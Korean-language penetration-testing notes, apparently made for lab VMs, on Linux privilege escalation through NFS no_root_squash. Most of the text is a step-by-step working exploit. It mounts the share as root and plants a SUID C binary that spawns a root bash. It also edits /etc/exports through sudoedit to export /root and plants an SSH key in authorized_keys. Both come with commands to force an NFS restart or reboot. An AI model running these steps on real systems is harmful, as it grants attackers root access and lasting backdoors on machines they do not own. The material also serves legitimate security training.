# 06_NFS no_root_squash

# 리눅스 권한상승 — NFS no_root_squash

---

## 개념

NFS는 네트워크로 파일을 공유하는 프로토콜이다

NFS는 ftp나 ssh같이 로그인 개념이 없고 네트워크로 파일시스템을 마운트하는 것이기 때문에 클라이언트에서 root로 접속해도 서버에서 권한을 다운그레이드 시키는 설정이 필요하다

즉 클라이언트의 상위권한을 nobody로 바꿔주는 설정이 root_squash이

여기서 `/etc/exports` 에 `no_root_squash` 옵션이 있으면, 클라이언트의 root가 서버의 root와 동일하게 처리되기 때문 에공격자(root)가 NFS 공유에 SUID 바이너리를 생성 가능해진다

---

## 탐지

```bash
# 피해자에서 확인
cat /etc/exports
showmount -e localhost
showmount -e <IP>
	
# 취약한 설정 예
# /share *(rw,no_root_squash)
# /home *(rw,no_root_squash,insecure)
```

---

## 공격 (공격자는 root 필요)

```bash
# 1단계: 칼리에서 공유 마운트 (root로)
showmount -e <타겟IP>
mkdir /tmp/nfs
mount -t nfs -o rw,vers=3 <타겟IP>:/share /tmp/nfs

# 2단계: SUID 바이너리 생성
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
gcc /tmp/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# 3단계: 피해자에서 실행
ls -la /share/shell    # SUID 확인
/share/shell           # → root!
```

---

## 마운트 해제

```bash
umount /tmp/nfs
```

---

## 팁

- `no_root_squash` 없어도 `root_squash` (기본값)가 있으면 공격 불가
- vers=3 안 되면 vers=2 또는 vers=4 시도
- 공유 경로가 홈 디렉터리이면 .ssh/authorized_keys 파일 추가 가능

# root_squash일 경우(no_root_squash 활성화)

이전과는 다르게 root_squash 활성화 되어 있을 경우를 가정한 방법이다

```bash
sudo -l 실행 결과
(root) NOPASSWD: sudoedit /etc/exports -> /etx/exports에 대한 쓰기 권한이 활성화 
되어 있는경우

____________________________________________________________________________/

1. /etc/exports 수정 (SSH 접속한 상태에서)
sudoedit /etc/exports
# /home/vulnix *(rw,no_root_squash)  ← root_squash 를 no_root_squash 로 변경

# NFS 재시작으로 변경사항 적용
sudo exportfs -a

2. Kali 에서 root 로 NFS 마운트 (새 터미널) 
umount /tmp/nfs_mount
mount -t nfs -o rw,vers=3 <타겟IP>:<공유경로> /tmp/nfs_mount

# ── 3. SUID 바이너리 생성 및 배치 ───────────────────────────
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /tmp/shell.c -o /tmp/nfs_mount/shell
chmod +s /tmp/nfs_mount/shell

# SUID 확인
ls -la /tmp/nfs_mount/shell
# -rwsr-xr-x 1 root root ... ← 정상

# ── 4. SSH 접속한 쉘에서 실행 ───────────────────────────────
ls -la ~/shell       # SUID 확인
~/shell              # → root 획득

```

### 재시작 권한 확인 방법

```bash
# ── NFS 재시작 권한 확인 및 방법 ────────────────────────────

# 재시작 권한 확인
sudo -l
# 아래 중 하나라도 있으면 재시작 가능
# (root) NOPASSWD: /etc/init.d/nfs-kernel-server restart
# (root) NOPASSWD: service nfs-kernel-server restart
# (root) NOPASSWD: exportfs
# (root) NOPASSWD: /sbin/reboot

# ── 재시작 방법 (권한 있는 경우) ────────────────────────────
sudo exportfs -rv
sudo /etc/init.d/nfs-kernel-server restart
sudo service nfs-kernel-server restart

# ── 재시작 방법 (권한 없는 경우) ────────────────────────────
# 위 명령어 모두 비밀번호 요구하거나 막히면
# 아래 순서로 시도

sudo reboot           # reboot 권한 있으면 가능
sudo shutdown -r now  # shutdown 권한 있으면 가능

# 둘 다 막히면
# VM 관리 프로그램에서 직접 재부팅(VM일 경우)
sudo virsh reboot <VM명>   # KVM/libvirt 환경
```

# root_squash일 경우(no_root_squash 활성화)

이전과 비슷한 조건이지만 재시작을 해도 권한상승이 안될 경우를 가정한 방법이다

```bash
# /etc/exports 를 이용한 권한상승 (NFS no_root_squash)

# ── 개념 ────────────────────────────────────────────────────
# /etc/exports = NFS 공유 설정 파일
# sudoedit /etc/exports 권한이 있으면
# NFS 공유 대상과 옵션을 수정 가능
# no_root_squash 옵션을 추가하면
# 클라이언트 root = 서버 root 로 취급
# → NFS 마운트 후 root 권한으로 파일 조작 가능

# ── 탐지 ────────────────────────────────────────────────────
sudo -l
# (root) NOPASSWD: sudoedit /etc/exports 확인

# ── 방식 1. SSH 키 심기 ────────────────────────────────
# 1. /etc/exports 수정
sudoedit /etc/exports
# /root *(rw,no_root_squash) 추가
# 공유 대상을 /root 로 지정
# no_root_squash 로 클라이언트 root 권한 유지

# 2. NFS 재시작 (막혀있으면 VM 재부팅)
# exportfs, service 명령어 모두 막혀있으면
# VM 재부팅이 유일한 방법
sudo exportfs -rv
sudo /etc/init.d/nfs-kernel-server restart

# 3. Kali 에서 공유 확인
showmount -e <타겟IP>
# /root * 뜨면 적용 성공

# 4. Kali root 로 /root 마운트
mount -t nfs -o rw,vers=3 <타겟IP>:/root /tmp/nfs_mount
ls -la /tmp/nfs_mount
# root root 로 뜨면 성공

# 5. SSH 키 심기
mkdir -p /tmp/nfs_mount/.ssh
chmod 700 /tmp/nfs_mount/.ssh
cat /tmp/nfs_key.pub > /tmp/nfs_mount/.ssh/authorized_keys
chmod 600 /tmp/nfs_mount/.ssh/authorized_keys

# 6. root 로 SSH 로그인
ssh -i /tmp/nfs_key \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o HostkeyAlgorithms=+ssh-rsa \
  root@<타겟IP>
  
____________________________________________________________________________/

# ── 방식 2. SUID 바이너리 ────────────────────────────────────

# 1. /etc/exports 수정 (SSH 접속한 상태에서)
sudoedit /etc/exports
# /root *(rw,no_root_squash) 추가

# NFS 재시작 시도 (막혀있으면 VM 재부팅)
sudo exportfs -rv
sudo /etc/init.d/nfs-kernel-server restart

# 2. 공유 확인 (Kali 에서)
showmount -e <타겟IP>
# /root * 뜨면 적용 성공

# 3. Kali root 로 /root 마운트
mount -t nfs -o rw,vers=3 <타겟IP>:/root /tmp/nfs_mount
ls -la /tmp/nfs_mount    # root root 로 뜨면 성공

# 4. SUID 바이너리 컴파일 후 마운트 폴더에 배치
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main(){
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /tmp/shell.c -o /tmp/nfs_mount/shell
chmod +s /tmp/nfs_mount/shell

# SUID 확인
ls -la /tmp/nfs_mount/shell
# -rwsr-xr-x 1 root root ... ← 정상

# 5. 피해자(SSH 접속한 쉘)에서 실행
ls -la ~/shell    # SUID 확인
~/shell           # → root 획득
```